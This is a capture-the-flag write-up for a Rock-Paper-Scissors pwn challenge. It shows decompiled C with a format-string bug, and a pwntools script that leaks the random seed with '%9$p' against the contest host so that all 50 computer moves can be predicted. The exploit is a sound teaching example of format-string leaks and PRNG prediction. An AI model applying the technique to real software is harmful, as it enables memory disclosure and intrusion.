This challenge was the third pwn challenge I solved during the event. It was a simple 64-bit binary, which printed the flag to us if we won Rock-Paper-Scissors 50 times in a row.
The odds of us actually winning this many times are incredibly slim, so we needed to find a vulnerability.
Let's put the binary in IDA and take a closer look at what the code does.

```c

__int64 rps()
{
  char player_choice; // [rsp+Eh] [rbp-12h] BYREF
  char computer_choice; // [rsp+Fh] [rbp-11h]
  int flush_char; // [rsp+10h] [rbp-10h]
  _BYTE possiblities[3]; // [rsp+15h] [rbp-Bh] BYREF
  unsigned __int64 canary; // [rsp+18h] [rbp-8h]

  canary = __readfsqword(0x28u);
  player_choice = 0;
  qmemcpy(possiblities, "rps", sizeof(possiblities));
  computer_choice = possiblities[rand() % 3];
  puts("Let's play!");
  while ( player_choice != 'r' && player_choice != 'p' && player_choice != 's' )
  {
    printf("Enter your choice (r/p/s): ");
    __isoc99_scanf("%c", &player_choice);
    do
      flush_char = getchar();
    while ( flush_char != '\n' && flush_char != -1 );
  }
  if ( player_choice == 'r' && computer_choice == 's'
    || player_choice == 'p' && computer_choice == 'r'
    || player_choice == 's' && computer_choice == 'p' )
  {
    puts("You win!");
    return 1LL;
  }
  else
  {
    puts("You lost.");
    return 0LL;
  }
}

int main(){
  fd = open("/dev/urandom", 0);
    if ( fd < 0 )
    {
      printf("Opening /dev/urandom failed");
      exit(1);
    }
    read(fd, &buf, 4uLL);
    close(fd);
    srand(buf);
    printf("Enter your name: ");
    fgets(s, 20, stdin);
    printf("Hi ");
    printf(s);
    puts("Let's play some Rock Paper Scissors!");
    puts("If you beat me 50 times in a row I'll give you a special prize.");
    for ( i = 0; i <= 49; ++i )
    {
      if ( (unsigned __int8)rps() != 1 )
      {
        puts("You didn't beat me enough times. Too bad!");
        exit(1);
      }
    }
    win();
}
```

The program will prompt us for a name and print it using printf. There is a clear FSB vulnerability here. FSBs are a powerful primitive and can be used to perform arbitrary writes and reads, as well as easily leak stack data from the stack.
Our goal is to win 50 times. The computer will read its seed from /dev/urandom and store it in the stack. With FSB, we can leak the value and predict the random numbers!
After some trial and error, I noticed that the seed was stored at %9$p. I then used the ctypes library to use the srand and rand functions. Here is my final script:

```py
from pwn import *
from ctypes import CDLL, c_char_p

libc = CDLL('/lib/x86_64-linux-gnu/libc.so.6')

p = remote("vsc.tf" , 3094)
p.recvuntil("name: ")

p.sendline("%9$p")


p.recvuntil("Hi ")

seed = int(p.recvn(10), 16)

libc.srand(seed)

print(hex(seed))

win = {
	"s": "r",
	"r": "p",
	"p": "s"
}
p.recvuntil("prize.")
p.recvuntil("play!")

for i in range(50):
	pc = "rps"[libc.rand() % 3]
	p.recvuntil("Enter your choice (r/p/s): ")
	p.sendline(win[pc])

p.interactive()
```
